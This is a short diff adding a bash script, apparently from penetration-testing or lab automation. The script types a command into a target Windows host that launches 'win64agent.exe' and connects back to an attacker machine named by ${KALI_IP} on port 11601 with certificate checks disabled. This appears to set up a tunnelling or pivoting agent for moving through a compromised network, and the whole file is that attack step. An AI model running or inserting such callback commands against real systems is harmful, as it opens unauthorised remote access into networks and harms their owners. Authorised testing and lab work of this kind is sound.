@@ -1,0 +1,6 @@
+#!/bin/bash
+
+com="./win64agent.exe -connect ${KALI_IP}:11601 -ignore-cert"
+
+type_command "${com}"
+type_newline
